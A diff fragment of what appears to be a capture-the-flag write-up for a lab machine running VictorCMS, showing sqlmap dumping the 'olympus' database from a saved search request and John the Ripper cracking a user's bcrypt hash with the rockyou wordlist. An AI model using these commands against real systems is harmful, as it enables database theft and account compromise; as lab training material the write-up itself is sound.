@@ -103,12 +103,12 @@ available databases [6]:
 [*] phpmyadmin
 [*] sys
 
-```
-
-```bash
 root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus
 ```
 ![image](https://user-images.githubusercontent.com/90036439/223977555-baf68ac5-5e32-4d50-b2c7-c0ea7013e61a.png)
+
+Now that we have hashes we can try to crack some user password. First i tried promotheus.
+After a while I got a password
 ```bash
 root@ip-10-10-70-200:~# john promotheus.hash -w=/usr/share/wordlists/rockyou.txt
 Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
